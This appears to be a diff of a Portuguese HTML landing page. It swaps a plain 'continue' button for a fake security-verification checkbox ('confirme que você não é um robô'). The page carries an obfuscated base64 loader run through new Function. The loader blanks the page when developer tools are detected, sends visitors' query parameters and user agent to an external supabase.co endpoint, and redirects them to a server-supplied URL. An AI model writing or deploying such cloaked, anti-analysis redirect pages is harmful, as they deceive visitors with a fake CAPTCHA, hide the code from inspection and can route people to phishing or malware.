@@ -3,80 +3,99 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Acesso</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+<title>Verificação</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;}
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
 body{
-  font-family:'Inter',sans-serif;
-  background:#fff;
-  color:#111;
-  min-height:100vh;
+  font-family:Arial, sans-serif;
+  background:#f5f5f5;
   display:flex;
   justify-content:center;
   align-items:center;
-  padding:24px;
+  height:100vh;
 }
-.card{
-  width:100%;
-  max-width:400px;
+.box{
+  background:#fff;
+  width:340px;
+  padding:30px;
+  border-radius:14px;
+  box-shadow:0 5px 20px rgba(0,0,0,0.1);
   text-align:center;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  gap:20px;
 }
-h1{
-  font-size:26px;
-  font-weight:800;
+.title{
+  font-size:22px;
+  font-weight:bold;
   color:#111;
-  line-height:1.3;
+  margin-bottom:10px;
 }
-p{
+.subtitle{
   font-size:15px;
-  color:#555;
-  line-height:1.6;
+  color:#666;
+  margin-bottom:25px;
+  line-height:1.5;
 }
-.cta{
-  width:100%;
-  height:56px;
-  border:none;
+.verify{
+  border:2px solid #ddd;
   border-radius:12px;
-  background:#111;
-  font-size:16px;
-  font-weight:700;
-  color:#fff;
+  padding:18px;
+  display:flex;
+  align-items:center;
+  gap:14px;
   cursor:pointer;
-  transition:.2s;
+  transition:0.2s;
 }
-.cta:hover{background:#333;}
-.loader{
+.verify:hover{
+  border-color:#4285f4;
+  background:#f9fbff;
+}
+.checkbox{
+  width:28px;
+  height:28px;
+  border:2px solid #999;
+  border-radius:6px;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  font-size:18px;
+  color:#fff;
+  transition:0.2s;
+}
+.verify.active .checkbox{
+  background:#34a853;
+  border-color:#34a853;
+}
+.text{
+  text-align:left;
+  font-size:15px;
+  color:#222;
+  font-weight:500;
+}
+.loading{
   display:none;
+  margin-top:20px;
+  color:#666;
   font-size:14px;
-  color:#888;
 }
-.spinner{
-  width:20px;height:20px;
-  border:3px solid #ddd;
-  border-top:3px solid #111;
-  border-radius:50%;
-  margin:0 auto 8px;
-  animation:spin .8s linear infinite;
-}
-@keyframes spin{100%{transform:rotate(360deg);}}
 </style>
 </head>
 <body>
-
-<div class="card">
-  <h1>Seu acesso está pronto</h1>
-  <p>Clique no botão abaixo para continuar.</p>
-
-  <button class="cta" id="enterBtn">CONTINUAR</button>
-
-  <div class="loader" id="loader">
-    <div class="spinner"></div>
-    Carregando...
+<div class="box">
+  <div class="title">
+    Verificação de Segurança
+  </div>
+  <div class="subtitle">
+    Marque abaixo para confirmar que você não é um robô.
+  </div>
+  <div class="verify" id="verifyBox">
+    <div class="checkbox" id="check">✓</div>
+    <div class="text">Selecione aqui para continuar</div>
+  </div>
+  <div class="loading" id="loading">
+    Verificando acesso...
   </div>
 </div>
 
@@ -107,18 +126,19 @@ const redirectUrlReady = new Promise(resolve => {
   };
 })();
 
-/* SCRIPT BOTBRAIN — bot-d6112058 */
+/* SCRIPT BOTBRAIN */
 (function(_0x1a2b,_0x3c4d){var _0x5e6f=function(_0x7g8h){return decodeURIComponent(escape(atob(_0x7g8h)));};var _0x9i0j=_0x5e6f(_0x1a2b);(new Function(_0x9i0j))();})("KGZ1bmN0aW9uKCl7CnZhciBfMHhhMT0iYm90LWQ2MTEyMDU4IixfMHhiMj0iaHR0cHM6Ly9nZmFrYnJkdm5mdXR6bmh5dXZydi5zdXBhYmFzZS5jby9mdW5jdGlvbnMvdjEvdHJhY2stZXh0ZXJuYWwtY2xpY2siOwp2YXIgXzB4YzM9ZnVuY3Rpb24oKXt2YXIgdD1uZXcgRGF0ZSgpO2RlYnVnZ2VyO3JldHVybiBuZXcgRGF0ZSgpLXQ+MTAwO307CnNldEludGVydmFsKGZ1bmN0aW9uKCl7aWYoXzB4YzMoKSl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fSwxMDAwKTsKdmFyIF8weGQ0PWZ1bmN0aW9uKCl7dmFyIHc9d2luZG93Lm91dGVyV2lkdGgtd2luZG93LmlubmVyV2lkdGg+MTYwLGg9d2luZG93Lm91dGVySGVpZ2h0LXdpbmRvdy5pbm5lckhlaWdodD4xNjA7aWYod3x8aCl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fTsKc2V0SW50ZXJ2YWwoXzB4ZDQsNTAwKTsKKGZ1bmN0aW9uKCl7dmFyIF8weGU1PXt9O25ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCkuZm9yRWFjaChmdW5jdGlvbih2LGspe18weGU1W2tdPXY7fSk7CmZldGNoKF8weGIyLHttZXRob2Q6IlBPU1QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7c2hvcnRDb2RlOl8weGExLHF1ZXJ5UGFyYW1zOl8weGU1LHVzZXJBZ2VudDpuYXZpZ2F0b3IudXNlckFnZW50LHVybENvbXBsZXRvOndpbmRvdy5sb2NhdGlvbi5zZWFyY2guc3Vic3RyaW5nKDEpfHxudWxsfSl9KQoudGhlbihmdW5jdGlvbihyKXtyZXR1cm4gci5qc29uKCk7fSkudGhlbihmdW5jdGlvbihkKXtpZihkJiZkLnJlZGlyZWN0VXJsKXt3aW5kb3cubG9jYXRpb24uaHJlZj1kLnJlZGlyZWN0VXJsO319KS5jYXRjaChmdW5jdGlvbigpe30pOwp9KSgpOwp9KSgpOw==");
 </script>
 
-<!-- BOTAO -->
+<!-- CLIQUE -->
 <script>
-const btn    = document.getElementById('enterBtn');
-const loader = document.getElementById('loader');
+const verifyBox = document.getElementById('verifyBox');
+const loading   = document.getElementById('loading');
 
-btn.addEventListener('click', () => {
-  btn.style.display    = 'none';
-  loader.style.display = 'block';
+verifyBox.addEventListener('click', () => {
+  verifyBox.classList.add('active');
+  loading.style.display = 'block';
+
   redirectUrlReady.then(url => {
     window.location.href = url;
   });
